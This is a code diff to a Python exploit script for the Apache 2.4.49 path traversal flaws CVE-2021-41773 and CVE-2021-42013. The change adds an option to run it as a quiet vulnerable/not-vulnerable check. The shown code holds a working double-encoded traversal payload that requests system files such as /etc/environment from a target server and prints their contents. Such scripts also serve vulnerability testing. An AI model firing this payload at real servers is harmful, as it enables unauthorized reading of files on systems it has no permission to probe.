@@ -42,7 +42,7 @@ os.system("color") # Remove this line if you're running this on Linux
 
 # Referenced from:
 # - https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
-def exploit(url):
+def exploit(url, output=True):
 
     paths = [
         "/etc/environment",
@@ -60,15 +60,15 @@ def exploit(url):
     
     #===========================#
 
-    print(f"{bcolors.FAIL}=" * 75 + f"{bcolors.ENDC}")
-    print(f"| ⚔️ {bcolors.FAIL}CVE-2021-41773 / CVE-2021-42013{bcolors.ENDC} ({bcolors.ORANGE}Apache 2.4.49{bcolors.ENDC} Path Traversal)")
-    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
+    if output: print(f"{bcolors.FAIL}=" * 75 + f"{bcolors.ENDC}")
+    print(f"| ⚔️ {bcolors.FAIL}CVE-2021-41773 / CVE-2021-42013{bcolors.ENDC} ({bcolors.ORANGE}Apache 2.4.49{bcolors.ENDC} Path Traversal)",end="")
+    if output: print(f"\n"+f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
     
     #===========================#
     
     for path in paths:
         
-        print(f"| [{bcolors.ORANGE}"+path+f"{bcolors.ENDC}]: ",end="")
+        if output: print(f"| [{bcolors.ORANGE}"+path+f"{bcolors.ENDC}]: ",end="")
 
         payloads = [
             url+"/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65"+path,
@@ -91,51 +91,57 @@ def exploit(url):
                 
                 if r.status_code == 200:
 
-                    print(f"[{bcolors.OKGREEN}"+str(r.status_code)+f"{bcolors.ENDC}]: "+r.text, end="")
+                    if output: print(f"[{bcolors.OKGREEN}"+str(r.status_code)+f"{bcolors.ENDC}]: "+r.text, end="")
+                    else:
+                        print(f": ❌ {bcolors.FAIL}Vulnerable{bcolors.ENDC}")
+                        return
                 
                 elif r.status_code == 301:
                 
-                    print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Moved Permanently{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Moved Permanently{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
                     
                 elif r.status_code == 302:
                 
-                    print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Found{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Found{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
                 
                 elif r.status_code == 303:
                 
-                    print(f"[{bcolors.WARNING}"+str(r.status_code)+f" See Other{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.WARNING}"+str(r.status_code)+f" See Other{bcolors.ENDC}] --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]", end="")
                 
                 elif r.status_code == 400:
                 
-                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Bad Request{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Bad Request{bcolors.ENDC}]", end="")
                 
                 elif r.status_code == 401:
                 
-                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Unauthorized{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Unauthorized{bcolors.ENDC}]", end="")
                 
                 elif r.status_code == 403:
                 
-                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Forbidden{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Forbidden{bcolors.ENDC}]", end="")
                 
                 elif r.status_code == 404:
                 
-                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Not Found{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Not Found{bcolors.ENDC}]", end="")
                 
                 elif r.status_code == 500:
                 
-                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Internal Server Error{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC} {bcolors.RED}Internal Server Error{bcolors.ENDC}]", end="")
                 
                 else:
                 
-                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC}]", end="")
+                    if output: print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC}]", end="")
             
             except Exception as e:
                 
                 print(f"[{bcolors.FAIL}Error{bcolors.ENDC}]: "+str(e))
             
-        print(f"")
+        if output: print(f"")
     
-    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
+    if output: print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
+    else:
+        print(f": ✅ {bcolors.OKGREEN}Not Vulnerable{bcolors.ENDC}")
+        return
 
 #===========================#
 
